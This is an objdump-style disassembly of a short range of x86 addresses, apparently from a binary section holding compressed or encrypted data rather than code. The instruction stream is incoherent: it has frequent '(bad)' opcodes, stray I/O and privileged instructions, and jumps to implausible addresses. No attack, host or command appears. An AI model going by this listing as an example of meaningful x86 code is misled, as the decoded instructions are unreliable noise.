  434f43:	ab                   	stos   %eax,%es:(%edi)
  434f44:	8d                   	lea    (bad),%esi
  434f45:	f2 99                	repnz cltd
  434f47:	e4 7e                	in     $0x7e,%al
  434f49:	99                   	cltd
  434f4a:	8e 42 89             	mov    -0x77(%edx),%es
  434f4d:	63 d5                	arpl   %edx,%ebp
  434f4f:	89 0d 6a 0b 13 f2    	mov    %ecx,0xf2130b6a
  434f55:	32 3e                	xor    (%esi),%bh
  434f57:	46                   	inc    %esi
  434f58:	48                   	dec    %eax
  434f59:	8d                   	lea    (bad),%ebx
  434f5a:	d9 35 33 57 28 3b    	fnstenv 0x3b285733
  434f60:	b7 53                	mov    $0x53,%bh
  434f62:	d6                   	salc
  434f63:	b7 b9                	mov    $0xb9,%bh
  434f65:	4b                   	dec    %ebx
  434f66:	b7 2b                	mov    $0x2b,%bh
  434f68:	7d e3                	jge    0x434f4d
  434f6a:	81 4b 91 a5 4c 78 45 	orl    $0x45784ca5,-0x6f(%ebx)
  434f71:	a8 25                	test   $0x25,%al
  434f73:	07                   	pop    %es
  434f74:	5e                   	pop    %esi
  434f75:	4f                   	dec    %edi
  434f76:	82 eb 01             	sub    $0x1,%bl
  434f79:	bb 7c 5b 8b f5       	mov    $0xf58b5b7c,%ebx
  434f7e:	d2 a6 74 60 e5 7a    	shlb   %cl,0x7ae56074(%esi)
  434f84:	0c 7f                	or     $0x7f,%al
  434f86:	25 b8 a6 5a 51       	and    $0x515aa6b8,%eax
  434f8b:	97                   	xchg   %eax,%edi
  434f8c:	4e                   	dec    %esi
  434f8d:	76 1e                	jbe    0x434fad
  434f8f:	e6 39                	out    %al,$0x39
  434f91:	85 d3                	test   %edx,%ebx
  434f93:	2f                   	das
  434f94:	77 af                	ja     0x434f45
  434f96:	bb fc b4 7a 24       	mov    $0x247ab4fc,%ebx
  434f9b:	18 31                	sbb    %dh,(%ecx)
  434f9d:	76 8b                	jbe    0x434f2a
  434f9f:	2e 03 c9             	cs add %ecx,%ecx
  434fa2:	18 5a 37             	sbb    %bl,0x37(%edx)
  434fa5:	0f 3b                	(bad)
  434fa7:	f6 5e d1             	negb   -0x2f(%esi)
  434faa:	fe                   	(bad)
  434fab:	f1                   	int1
  434fac:	b6 49                	mov    $0x49,%dh
  434fae:	62 cd 97             	(bad) {rz-bad},{%k5}{z}
  434fb1:	f5                   	cmc
  434fb2:	4f                   	dec    %edi
  434fb3:	77 b6                	ja     0x434f6b
  434fb5:	e6 af                	out    %al,$0xaf
  434fb7:	a2 5b 6b ea c0       	mov    %al,0xc0ea6b5b
  434fbc:	03 1d 1e ac 80 4d    	add    0x4d80ac1e,%ebx
  434fc2:	1a 72 9a             	sbb    -0x66(%edx),%dh
  434fc5:	2a 3f                	sub    (%edi),%bh
  434fc7:	13 ef                	adc    %edi,%ebp
  434fc9:	6f                   	outsl  %ds:(%esi),(%dx)
  434fca:	ee                   	out    %al,(%dx)
  434fcb:	33 a8 fe 7c bb 29    	xor    0x29bb7cfe(%eax),%ebp
  434fd1:	0f 7a                	(bad)
  434fd3:	43                   	inc    %ebx
  434fd4:	6c                   	insb   (%dx),%es:(%edi)
  434fd5:	fa                   	cli
  434fd6:	49                   	dec    %ecx
  434fd7:	60                   	pusha
  434fd8:	65 da a7 b5 26 25 ce 	fisubl %gs:-0x31dad94b(%edi)
  434fdf:	c6                   	(bad)
  434fe0:	ad                   	lods   %ds:(%esi),%eax
  434fe1:	57                   	push   %edi
  434fe2:	98                   	cwtl
  434fe3:	5b                   	pop    %ebx
  434fe4:	e5 e0                	in     $0xe0,%eax
  434fe6:	29 df                	sub    %ebx,%edi
  434fe8:	96                   	xchg   %eax,%esi
  434fe9:	87 f6                	xchg   %esi,%esi
  434feb:	1d 10 93 01 59       	sbb    $0x59019310,%eax
  434ff0:	93                   	xchg   %eax,%ebx
  434ff1:	97                   	xchg   %eax,%edi
  434ff2:	74 f7                	je     0x434feb
  434ff4:	48                   	dec    %eax
  434ff5:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  434ff6:	90                   	nop
  434ff7:	7a 17                	jp     0x435010
  434ff9:	2a b9 a3 0d 6b e0    	sub    -0x1f94f25d(%ecx),%bh
  434fff:	01 38                	add    %edi,(%eax)
  435001:	c2 32 87             	ret    $0x8732
  435004:	41                   	inc    %ecx
  435005:	2d 09 2b 7d 05       	sub    $0x57d2b09,%eax
  43500a:	28 17                	sub    %dl,(%edi)
  43500c:	87 6e 2a             	xchg   %ebp,0x2a(%esi)
  43500f:	90                   	nop
  435010:	69 19 75 42 48 09    	imul   $0x9484275,(%ecx),%ebx
  435016:	4e                   	dec    %esi
  435017:	4c                   	dec    %esp
  435018:	e9 80 65 c1 19       	jmp    0x1a04b59d
  43501d:	8e f9                	mov    %ecx,%?
  43501f:	22 7e 76             	and    0x76(%esi),%bh
  435022:	90                   	nop
  435023:	ce                   	into
  435024:	33 3e                	xor    (%esi),%edi
  435026:	d2 86 6e dc ec cc    	rolb   %cl,-0x33132392(%esi)
  43502c:	ca fa 95             	lret   $0x95fa
  43502f:	f5                   	cmc
  435030:	8f 01                	pop    (%ecx)
  435032:	64 5a                	fs pop %edx
  435034:	1a d7                	sbb    %bh,%dl
  435036:	df cd                	(bad)
  435038:	cf                   	iret
  435039:	db 59 87             	fistpl -0x79(%ecx)
  43503c:	28 64 cc e6          	sub    %ah,-0x1a(%esp,%ecx,8)
  435040:	0a 47 a0             	or     -0x60(%edi),%al
  435043:	39 1a                	cmp    %ebx,(%edx)
  435045:	12 5f 99             	adc    -0x67(%edi),%bl
  435048:	5d                   	pop    %ebp
  435049:	04 0b                	add    $0xb,%al
  43504b:	c3                   	ret
  43504c:	4f                   	dec    %edi
  43504d:	96                   	xchg   %eax,%esi
  43504e:	5f                   	pop    %edi
  43504f:	94                   	xchg   %eax,%esp
  435050:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  435051:	1b 2c 8e             	sbb    (%esi,%ecx,4),%ebp
  435054:	cc                   	int3
  435055:	69 99 b6 c3 12 4c ed 	imul   $0xa9069ed,0x4c12c3b6(%ecx),%ebx
  43505c:	69 90 0a 
  43505f:	49                   	dec    %ecx
  435060:	b3 59                	mov    $0x59,%bl
  435062:	80 ad 0d 1e d4 a0 5d 	subb   $0x5d,-0x5f2be1f3(%ebp)
  435069:	c6                   	(bad)
  43506a:	3a a3 b9 0a 1c 2b    	cmp    0x2b1c0ab9(%ebx),%ah
  435070:	e4 79                	in     $0x79,%al
  435072:	3d b5 6a 40 f5       	cmp    $0xf5406ab5,%eax
  435077:	da d3                	fcmovbe %st(3),%st
  435079:	50                   	push   %eax
  43507a:	34 4f                	xor    $0x4f,%al
  43507c:	d8 7f 36             	fdivrs 0x36(%edi)
  43507f:	37                   	aaa
  435080:	b7 2b                	mov    $0x2b,%bh
  435082:	e9 5f 15 7b d8       	jmp    0xd8be65e6
  435087:	30 36                	xor    %dh,(%esi)
  435089:	6f                   	outsl  %ds:(%esi),(%dx)
  43508a:	61                   	popa
  43508b:	69 b2 97 23 ec 81 07 	imul   $0xeb3b8607,-0x7e13dc69(%edx),%esi
  435092:	86 3b eb 
  435095:	62 6d ab             	bound  %ebp,-0x55(%ebp)
  435098:	bc b4 6e 26 d1       	mov    $0xd1266eb4,%esp
  43509d:	df 6b 45             	fildll 0x45(%ebx)
  4350a0:	d5 e0                	aad    $0xe0
  4350a2:	e0 1b                	loopne 0x4350bf
  4350a4:	1d 50 17 d7 cd       	sbb    $0xcdd71750,%eax
  4350a9:	19 0c 03             	sbb    %ecx,(%ebx,%eax,1)
  4350ac:	a3 fe 86 2f 8b       	mov    %eax,0x8b2f86fe
  4350b1:	e8 c3 8f 42 bf       	call   0xbf85e079
  4350b6:	d9 b5 8c bb dc 76    	fnstenv 0x76dcbb8c(%ebp)
  4350bc:	53                   	push   %ebx
  4350bd:	63 ff                	arpl   %edi,%edi
  4350bf:	bc 77 9c 5c 5c       	mov    $0x5c5c9c77,%esp
  4350c4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4350c5:	e3 3a                	jecxz  0x435101
  4350c7:	2f                   	das
  4350c8:	27                   	daa
  4350c9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4350ca:	18 60 a3             	sbb    %ah,-0x5d(%eax)
  4350cd:	97                   	xchg   %eax,%edi
  4350ce:	58                   	pop    %eax
  4350cf:	1c f8                	sbb    $0xf8,%al
  4350d1:	48                   	dec    %eax
  4350d2:	a1 82 6c ad 69       	mov    0x69ad6c82,%eax
  4350d7:	17                   	pop    %ss
  4350d8:	db c1                	fcmovnb %st(1),%st
  4350da:	17                   	pop    %ss
  4350db:	82 06 e7             	addb   $0xe7,(%esi)
  4350de:	6c                   	insb   (%dx),%es:(%edi)
  4350df:	fc                   	cld
  4350e0:	63 97 ba 44 56 9b    	arpl   %edx,-0x64a9bb46(%edi)
  4350e6:	10 74 6e f4          	adc    %dh,-0xc(%esi,%ebp,2)
  4350ea:	52                   	push   %edx
  4350eb:	47                   	inc    %edi
  4350ec:	99                   	cltd
  4350ed:	3c 27                	cmp    $0x27,%al
  4350ef:	ac                   	lods   %ds:(%esi),%al
  4350f0:	d9 1f                	fstps  (%edi)
  4350f2:	bb 55 7e db fe       	mov    $0xfedb7e55,%ebx
  4350f7:	5d                   	pop    %ebp
  4350f8:	f9                   	stc
  4350f9:	cc                   	int3
  4350fa:	b8 2c 55 78 6b       	mov    $0x6b78552c,%eax
  4350ff:	db a0 a2 6f 3e ee    	(bad) -0x11c1905e(%eax)
  435105:	1f                   	pop    %ds
  435106:	9e                   	sahf
  435107:	fb                   	sti
  435108:	d7                   	xlat   %ds:(%ebx)
  435109:	90                   	nop
  43510a:	8c e1                	mov    %fs,%ecx
  43510c:	05 46 0a 8d cc       	add    $0xcc8d0a46,%eax
  435111:	2b 14 94             	sub    (%esp,%edx,4),%edx
  435114:	28 06                	sub    %al,(%esi)
  435116:	8d 11                	lea    (%ecx),%edx
  435118:	e4 53                	in     $0x53,%al
  43511a:	4a                   	dec    %edx
  43511b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  43511c:	86 53 3b             	xchg   %dl,0x3b(%ebx)
  43511f:	0d 14 3e 01 bc       	or     $0xbc013e14,%eax
  435124:	fb                   	sti
  435125:	4f                   	dec    %edi
  435126:	2d 0a 1e 91 23       	sub    $0x23911e0a,%eax
  43512b:	6e                   	outsb  %ds:(%esi),(%dx)
  43512c:	40                   	inc    %eax
  43512d:	b1 cc                	mov    $0xcc,%cl
  43512f:	38 ba 0e dc 7a ea    	cmp    %bh,-0x158523f2(%edx)
  435135:	e2 5f                	loop   0x435196
  435137:	ec                   	in     (%dx),%al
  435138:	0a d0                	or     %al,%dl
  43513a:	a9 e8 a8 2f 09       	test   $0x92fa8e8,%eax
  43513f:	be 51 d2 c2 50       	mov    $0x50c2d251,%esi
  435144:	15 b2 a4 b9 75       	adc    $0x75b9a4b2,%eax
  435149:	58                   	pop    %eax
  43514a:	48                   	dec    %eax
  43514b:	3e bf 1e f5 2a e8    	ds mov $0xe82af51e,%edi
  435151:	29 11                	sub    %edx,(%ecx)
  435153:	7f fc                	jg     0x435151
  435155:	da c3                	fcmovb %st(3),%st
  435157:	2f                   	das
  435158:	40                   	inc    %eax
  435159:	88 62 a7             	mov    %ah,-0x59(%edx)
  43515c:	c2 8a 85             	ret    $0x858a
  43515f:	58                   	pop    %eax
  435160:	eb 7a                	jmp    0x4351dc
  435162:	8d                   	lea    (bad),%esp
  435163:	e3 92                	jecxz  0x4350f7
  435165:	e0 6b                	loopne 0x4351d2
  435167:	c3                   	ret
  435168:	47                   	inc    %edi
  435169:	23 87 43 42 4a 84    	and    -0x7bb5bdbd(%edi),%eax
  43516f:	c0 69 51 4b          	shrb   $0x4b,0x51(%ecx)
  435173:	f3 9a 7b 9f d4 3f 08 	repz lcall $0xcd08,$0x3fd49f7b
  43517a:	cd 
  43517b:	a8 50                	test   $0x50,%al
  43517d:	f7 ab 48 d5 2a 3f    	imull  0x3f2ad548(%ebx)
  435183:	98                   	cwtl
  435184:	d1 21                	shll   $1,(%ecx)
  435186:	2c fe                	sub    $0xfe,%al
  435188:	a2 5d 95 6d aa       	mov    %al,0xaa6d955d
  43518d:	21 37                	and    %esi,(%edi)
  43518f:	d0 62 2e             	shlb   $1,0x2e(%edx)
  435192:	88 72 21             	mov    %dh,0x21(%edx)
  435195:	46                   	inc    %esi
  435196:	69 23 6c ff 74 e5    	imul   $0xe574ff6c,(%ebx),%esp
  43519c:	52                   	push   %edx
  43519d:	65 93                	gs xchg %eax,%ebx
  43519f:	75 65                	jne    0x435206
  4351a1:	e4 fc                	in     $0xfc,%al
  4351a3:	5c                   	pop    %esp
  4351a4:	12 06                	adc    (%esi),%al
  4351a6:	60                   	pusha
  4351a7:	ad                   	lods   %ds:(%esi),%eax
  4351a8:	82 c2 06             	add    $0x6,%dl
  4351ab:	ab                   	stos   %eax,%es:(%edi)
  4351ac:	22 d3                	and    %bl,%dl
  4351ae:	5b                   	pop    %ebx
  4351af:	1d 89 c7 95 e6       	sbb    $0xe695c789,%eax
  4351b4:	d9 b2 53 49 32 90    	fnstenv -0x6fcdb6ad(%edx)
  4351ba:	2f                   	das
  4351bb:	2d ae 6f 8b 3e       	sub    $0x3e8b6fae,%eax
  4351c0:	50                   	push   %eax
  4351c1:	1a 5f c8             	sbb    -0x38(%edi),%bl
  4351c4:	1a a0 1f f2 a2 e1    	sbb    -0x1e5d0de1(%eax),%ah
  4351ca:	35 2e 2d 96 39       	xor    $0x39962d2e,%eax
  4351cf:	19 bf 8e 35 09 ef    	sbb    %edi,-0x10f6ca72(%edi)
  4351d5:	6c                   	insb   (%dx),%es:(%edi)
  4351d6:	0f c8                	bswap  %eax
  4351d8:	a9 3c 37 9a 68       	test   $0x689a373c,%eax
  4351dd:	67 8d                	addr16 lea (bad),%eax
  4351df:	c1 93 b8 c2 e9 b9 99 	rcll   $0x99,-0x46163d48(%ebx)
  4351e6:	f5                   	cmc
  4351e7:	00 ce                	add    %cl,%dh
  4351e9:	b4 6c                	mov    $0x6c,%ah
  4351eb:	36 d4 59             	ss aam $0x59
  4351ee:	62 d1 d5 14 ae       	(bad)
  4351f3:	5a                   	pop    %edx
  4351f4:	2f                   	das
  4351f5:	10 29                	adc    %ch,(%ecx)
  4351f7:	25 35 5e b6 68       	and    $0x68b65e35,%eax
  4351fc:	bc 10 00 5d 0c       	mov    $0xc5d0010,%esp
  435201:	d9 32                	fnstenv (%edx)
  435203:	07                   	pop    %es
  435204:	0a 40 aa             	or     -0x56(%eax),%al
  435207:	b3 8f                	mov    $0x8f,%bl
  435209:	0c 75                	or     $0x75,%al
  43520b:	c3                   	ret
  43520c:	6d                   	insl   (%dx),%es:(%edi)
  43520d:	53                   	push   %ebx
  43520e:	a9 ac 20 46 a9       	test   $0xa94620ac,%eax
  435213:	3f                   	aas
  435214:	4c                   	dec    %esp
  435215:	49                   	dec    %ecx
  435216:	fe                   	(bad)
  435217:	f7 2d 7b c7 b3 80    	imull  0x80b3c77b
  43521d:	66 d4 e2             	data16 aam $0xe2
  435220:	ce                   	into
  435221:	1b 27                	sbb    (%edi),%esp
  435223:	c8 2c 34 71          	enter  $0x342c,$0x71
  435227:	5f                   	pop    %edi
  435228:	f0 3e 64 a7          	lock ds cmpsl %es:(%edi),%fs:(%esi)
  43522c:	22 bf 01 32 87 f6    	and    -0x978cdff(%edi),%bh
  435232:	30 f9                	xor    %bh,%cl
  435234:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  435235:	ba ae b0 78 be       	mov    $0xbe78b0ae,%edx
  43523a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  43523b:	07                   	pop    %es
  43523c:	e0 60                	loopne 0x43529e
  43523e:	f0 af                	lock scas %es:(%edi),%eax
  435240:	0e                   	push   %cs
  435241:	d6                   	salc
  435242:	7c c2                	jl     0x435206
  435244:	91                   	xchg   %eax,%ecx
  435245:	2c 6f                	sub    $0x6f,%al
  435247:	c5 a7 4c 35 5a 74    	lds    0x745a354c(%edi),%esp
  43524d:	7e 77                	jle    0x4352c6
  43524f:	a9 e3 18 5e 3b       	test   $0x3b5e18e3,%eax
  435254:	79 27                	jns    0x43527d
  435256:	48                   	dec    %eax
  435257:	e6 db                	out    %al,$0xdb
  435259:	cf                   	iret
  43525a:	a2 fa b3 0f fb       	mov    %al,0xfb0fb3fa
  43525f:	6c                   	insb   (%dx),%es:(%edi)
  435260:	2a a9 ec a0 bf 1b    	sub    0x1bbfa0ec(%ecx),%ch
  435266:	2b da                	sub    %edx,%ebx
  435268:	55                   	push   %ebp
  435269:	01 9a 52 33 be ef    	add    %ebx,-0x1041ccae(%edx)
  43526f:	5d                   	pop    %ebp
  435270:	c9                   	leave
  435271:	70 32                	jo     0x4352a5
  435273:	18 ce                	sbb    %cl,%dh
  435275:	97                   	xchg   %eax,%edi
  435276:	8a 3d 6b d3 96 68    	mov    0x6896d36b,%bh
  43527c:	68 e3 97 3a 4f       	push   $0x4f3a97e3
  435281:	39 35 1f 70 cb 63    	cmp    %esi,0x63cb701f
  435287:	6f                   	outsl  %ds:(%esi),(%dx)
  435288:	aa                   	stos   %al,%es:(%edi)
  435289:	8e d9                	mov    %ecx,%ds
  43528b:	34 1e                	xor    $0x1e,%al
  43528d:	ec                   	in     (%dx),%al
  43528e:	35 bc ae 8c 73       	xor    $0x738caebc,%eax
  435293:	9b                   	fwait
  435294:	b0 c1                	mov    $0xc1,%al
  435296:	ed                   	in     (%dx),%eax
  435297:	ea a4 aa d0 96 2b 83 	ljmp   $0x832b,$0x96d0aaa4
  43529e:	95                   	xchg   %eax,%ebp
  43529f:	9c                   	pushf
  4352a0:	15 2e d0 b2 74       	adc    $0x74b2d02e,%eax
  4352a5:	52                   	push   %edx
  4352a6:	06                   	push   %es
  4352a7:	22 04 78             	and    (%eax,%edi,2),%al
  4352aa:	73 fd                	jae    0x4352a9
  4352ac:	b0 6c                	mov    $0x6c,%al
  4352ae:	55                   	push   %ebp
  4352af:	13 e0                	adc    %eax,%esp
  4352b1:	0d 11 09 2c 02       	or     $0x22c0911,%eax
  4352b6:	d1 46 c5             	roll   $1,-0x3b(%esi)
  4352b9:	d4 98                	aam    $0x98
  4352bb:	28 37                	sub    %dh,(%edi)
  4352bd:	08 5a c1             	or     %bl,-0x3f(%edx)
  4352c0:	90                   	nop
  4352c1:	a0 5d 11 df b3       	mov    0xb3df115d,%al
  4352c6:	50                   	push   %eax
  4352c7:	44                   	inc    %esp
  4352c8:	61                   	popa
  4352c9:	ba 8d 7b 39 d3       	mov    $0xd3397b8d,%edx
  4352ce:	de 02                	fiadds (%edx)
  4352d0:	88 ba bf 6f b9 38    	mov    %bh,0x38b96fbf(%edx)
  4352d6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4352d7:	d1 65 48             	shll   $1,0x48(%ebp)
  4352da:	48                   	dec    %eax
  4352db:	ce                   	into
  4352dc:	90                   	nop
  4352dd:	ae                   	scas   %es:(%edi),%al
  4352de:	2e 1f                	cs pop %ds
  4352e0:	ed                   	in     (%dx),%eax
  4352e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4352e2:	79 63                	jns    0x435347
  4352e4:	28 9d bd fc 94 a4    	sub    %bl,-0x5b6b0343(%ebp)
  4352ea:	bc 02 b2 28 fd       	mov    $0xfd28b202,%esp
  4352ef:	7c be                	jl     0x4352af
  4352f1:	31 b1 04 ff 65 56    	xor    %esi,0x5665ff04(%ecx)
  4352f7:	d1 07                	roll   $1,(%edi)
  4352f9:	80 00 e7             	addb   $0xe7,(%eax)
  4352fc:	94                   	xchg   %eax,%esp
  4352fd:	b9 d0 95 7e 36       	mov    $0x367e95d0,%ecx
  435302:	26 d9 d7             	es (bad)
  435305:	61                   	popa
  435306:	8d 72 d0             	lea    -0x30(%edx),%esi
  435309:	0c 63                	or     $0x63,%al
  43530b:	45                   	inc    %ebp
  43530c:	28 4f b1             	sub    %cl,-0x4f(%edi)
  43530f:	5e                   	pop    %esi
  435310:	5c                   	pop    %esp
  435311:	d1 32                	shll   $1,(%edx)
  435313:	52                   	push   %edx
  435314:	f6 7c 0e b9          	idivb  -0x47(%esi,%ecx,1)
  435318:	b4 74                	mov    $0x74,%ah
  43531a:	14 e4                	adc    $0xe4,%al
  43531c:	73 71                	jae    0x43538f
  43531e:	c7                   	(bad)
  43531f:	f0 cf                	lock iret
  435321:	99                   	cltd
  435322:	d4 4e                	aam    $0x4e
  435324:	41                   	inc    %ecx
  435325:	d2 7a 4b             	sarb   %cl,0x4b(%edx)
  435328:	0d 26 4c 7a 29       	or     $0x297a4c26,%eax
  43532d:	c0 32 0f             	shlb   $0xf,(%edx)
  435330:	69 52 7a ef d9 ee 3e 	imul   $0x3eeed9ef,0x7a(%edx),%edx
  435337:	aa                   	stos   %al,%es:(%edi)
  435338:	c0 0a fd             	rorb   $0xfd,(%edx)
  43533b:	36 5e                	ss pop %esi
  43533d:	f5                   	cmc
  43533e:	10 1b                	adc    %bl,(%ebx)
  435340:	8b 23                	mov    (%ebx),%esp
  435342:	30 21                	xor    %ah,(%ecx)
  435344:	9c                   	pushf
  435345:	ba 5d ea c7 12       	mov    $0x12c7ea5d,%edx
  43534a:	3b d2                	cmp    %edx,%edx
  43534c:	3c fc                	cmp    $0xfc,%al
  43534e:	53                   	push   %ebx
  43534f:	d1 dc                	rcr    $1,%esp
  435351:	d7                   	xlat   %ds:(%ebx)
  435352:	8b 9e 1b 66 9b 17    	mov    0x179b661b(%esi),%ebx
  435358:	73 38                	jae    0x435392
  43535a:	6e                   	outsb  %ds:(%esi),(%dx)
  43535b:	cd 9f                	int    $0x9f
  43535d:	1c 70                	sbb    $0x70,%al
  43535f:	d0 f7                	shl    $1,%bh
  435361:	db fc                	(bad)
  435363:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  435364:	2a 82 3e 23 e5 0e    	sub    0xee5233e(%edx),%al
  43536a:	ed                   	in     (%dx),%eax
  43536b:	2f                   	das
  43536c:	31 3c f2             	xor    %edi,(%edx,%esi,8)
  43536f:	08 e8                	or     %ch,%al
  435371:	db 9d 60 45 6d 68    	fistpl 0x686d4560(%ebp)
  435377:	4f                   	dec    %edi
  435378:	aa                   	stos   %al,%es:(%edi)
  435379:	93                   	xchg   %eax,%ebx
  43537a:	a2 6a af 48 34       	mov    %al,0x3448af6a
  43537f:	bd b5 7f 95 36       	mov    $0x36957fb5,%ebp
  435384:	44                   	inc    %esp
  435385:	74 5f                	je     0x4353e6
  435387:	0d be 63 79 1b       	or     $0x1b7963be,%eax
  43538c:	82 48 6f 56          	orb    $0x56,0x6f(%eax)
  435390:	13 cd                	adc    %ebp,%ecx
  435392:	df 29                	fildll (%ecx)
  435394:	82 3a 2d             	cmpb   $0x2d,(%edx)
  435397:	17                   	pop    %ss
  435398:	d7                   	xlat   %ds:(%ebx)
  435399:	4c                   	dec    %esp
  43539a:	73 2c                	jae    0x4353c8
  43539c:	df 87 4e 55 49 98    	filds  -0x67b6aab2(%edi)
  4353a2:	7f 95                	jg     0x435339
  4353a4:	fd                   	std
  4353a5:	dd 07                	fldl   (%edi)
  4353a7:	85 fc                	test   %edi,%esp
  4353a9:	44                   	inc    %esp
  4353aa:	30 ce                	xor    %cl,%dh
  4353ac:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4353ad:	8e 8c 85 a1 5b 2f 27 	mov    0x272f5ba1(%ebp,%eax,4),%cs
  4353b4:	3f                   	aas
  4353b5:	3a 5d 2a             	cmp    0x2a(%ebp),%bl
  4353b8:	cc                   	int3
  4353b9:	42                   	inc    %edx
  4353ba:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4353bb:	b7 4c                	mov    $0x4c,%bh
  4353bd:	53                   	push   %ebx
  4353be:	62 98 07 72 99 c3    	bound  %ebx,-0x3c668df9(%eax)
  4353c4:	cc                   	int3
  4353c5:	21 6e d2             	and    %ebp,-0x2e(%esi)
  4353c8:	8e 12                	mov    (%edx),%ss
  4353ca:	77 29                	ja     0x4353f5
  4353cc:	65 32 1a             	xor    %gs:(%edx),%bl
  4353cf:	ba e1 c7 4c 91       	mov    $0x914cc7e1,%edx
  4353d4:	8d 59 1e             	lea    0x1e(%ecx),%ebx
  4353d7:	22 72 85             	and    -0x7b(%edx),%dh
  4353da:	96                   	xchg   %eax,%esi
  4353db:	23 43 7e             	and    0x7e(%ebx),%eax
  4353de:	2d 96 e2 39 9c       	sub    $0x9c39e296,%eax
  4353e3:	17                   	pop    %ss
  4353e4:	2f                   	das
  4353e5:	ed                   	in     (%dx),%eax
  4353e6:	bc 00 30 43 3b       	mov    $0x3b433000,%esp
  4353eb:	47                   	inc    %edi
  4353ec:	e8 71 e4 66 d2       	call   0xd2aa3862
  4353f1:	cf                   	iret
  4353f2:	07                   	pop    %es
  4353f3:	bd 2c c7 56 d5       	mov    $0xd556c72c,%ebp
  4353f8:	87 ec                	xchg   %ebp,%esp
  4353fa:	4d                   	dec    %ebp
  4353fb:	68 fb 6e 5c 7f       	push   $0x7f5c6efb
  435400:	8c ab 54 27 24 48    	mov    %gs,0x48242754(%ebx)
  435406:	70 62                	jo     0x43546a
  435408:	8d 60 04             	lea    0x4(%eax),%esp
  43540b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  43540c:	07                   	pop    %es
  43540d:	5b                   	pop    %ebx
  43540e:	09 d1                	or     %edx,%ecx
  435410:	9c                   	pushf
  435411:	d4 06                	aam    $0x6
  435413:	9f                   	lahf
  435414:	09 bc e4 b8 c1 f7 bc 	or     %edi,-0x43083e48(%esp,%eiz,8)
  43541b:	12 99 5e b3 eb 54    	adc    0x54ebb35e(%ecx),%bl
  435421:	1d ad 3b c9 57       	sbb    $0x57c93bad,%eax
  435426:	f5                   	cmc
  435427:	97                   	xchg   %eax,%edi
  435428:	0e                   	push   %cs
  435429:	cc                   	int3
  43542a:	1a a7 3c 71 83 b9    	sbb    -0x467c8ec4(%edi),%ah
  435430:	13 dd                	adc    %ebp,%ebx
  435432:	a3 2a 2a 0e 59       	mov    %eax,0x590e2a2a
  435437:	6f                   	outsl  %ds:(%esi),(%dx)
  435438:	fa                   	cli
  435439:	05 3f 7a 7a 88       	add    $0x887a7a3f,%eax
  43543e:	22 bc 24 bf e1 04 24 	and    0x2404e1bf(%esp),%bh
  435445:	58                   	pop    %eax
  435446:	1c 8d                	sbb    $0x8d,%al
  435448:	0d b4 78 52 6c       	or     $0x6c5278b4,%eax
  43544d:	c5 66 d0             	lds    -0x30(%esi),%esp
  435450:	3f                   	aas
  435451:	3f                   	aas
  435452:	a0 c3 1c 40 0a       	mov    0xa401cc3,%al
  435457:	87 60 94             	xchg   %esp,-0x6c(%eax)
  43545a:	b5 d8                	mov    $0xd8,%ch
  43545c:	36 3a dc             	ss cmp %ah,%bl
  43545f:	9a 0f 6e 48 35 44 85 	lcall  $0x8544,$0x35486e0f
  435466:	6a a1                	push   $0xffffffa1
  435468:	63 04 22             	arpl   %eax,(%edx,%eiz,1)
  43546b:	0e                   	push   %cs
  43546c:	ca da 0d             	lret   $0xdda
  43546f:	ea 12 8d 61 30 f3 2e 	ljmp   $0x2ef3,$0x30618d12
  435476:	57                   	push   %edi
  435477:	bf a1 16 31 29       	mov    $0x293116a1,%edi
  43547c:	57                   	push   %edi
  43547d:	8f 69 c8 3c          	(bad)
  435481:	4b                   	dec    %ebx
  435482:	7a 61                	jp     0x4354e5
  435484:	47                   	inc    %edi
  435485:	40                   	inc    %eax
  435486:	ca f0 5f             	lret   $0x5ff0
  435489:	92                   	xchg   %eax,%edx
  43548a:	fd                   	std
  43548b:	2f                   	das
  43548c:	5b                   	pop    %ebx
  43548d:	da 0d 9d 9f 6b 20    	fimull 0x206b9f9d
  435493:	8d 98 d7 4a f3 c8    	lea    -0x370cb529(%eax),%ebx
  435499:	be be 23 23 7e       	mov    $0x7e2323be,%esi
  43549e:	94                   	xchg   %eax,%esp
  43549f:	1d c4 1f 12 25       	sbb    $0x25121fc4,%eax
  4354a4:	3a ff                	cmp    %bh,%bh
  4354a6:	d8 ec                	fsubr  %st(4),%st
  4354a8:	5c                   	pop    %esp
  4354a9:	c3                   	ret
  4354aa:	49                   	dec    %ecx
  4354ab:	ee                   	out    %al,(%dx)
  4354ac:	56                   	push   %esi
  4354ad:	fa                   	cli
  4354ae:	79 4e                	jns    0x4354fe
  4354b0:	9d                   	popf
  4354b1:	87 65 90             	xchg   %esp,-0x70(%ebp)
  4354b4:	dc 86 91 c2 3d e1    	faddl  -0x1ec23d6f(%esi)
  4354ba:	59                   	pop    %ecx
  4354bb:	d1 89 57 cd 8f c1    	rorl   $1,-0x3e7032a9(%ecx)
  4354c1:	24 c5                	and    $0xc5,%al
  4354c3:	e3 41                	jecxz  0x435506
  4354c5:	14 b1                	adc    $0xb1,%al
  4354c7:	17                   	pop    %ss
  4354c8:	73 c0                	jae    0x43548a
  4354ca:	ae                   	scas   %es:(%edi),%al
  4354cb:	c0 1c 6b f5          	rcrb   $0xf5,(%ebx,%ebp,2)
  4354cf:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4354d0:	25 c4 16 2a a6       	and    $0xa62a16c4,%eax
  4354d5:	a8 fb                	test   $0xfb,%al
  4354d7:	35 8e b2 df eb       	xor    $0xebdfb28e,%eax
  4354dc:	ba b8 03 40 e8       	mov    $0xe84003b8,%edx
  4354e1:	23 04 3e             	and    (%esi,%edi,1),%eax
  4354e4:	ab                   	stos   %eax,%es:(%edi)
  4354e5:	d1 3e                	sarl   $1,(%esi)
  4354e7:	56                   	push   %esi
  4354e8:	b5 05                	mov    $0x5,%ch
  4354ea:	2b 10                	sub    (%eax),%edx
  4354ec:	10 38                	adc    %bh,(%eax)
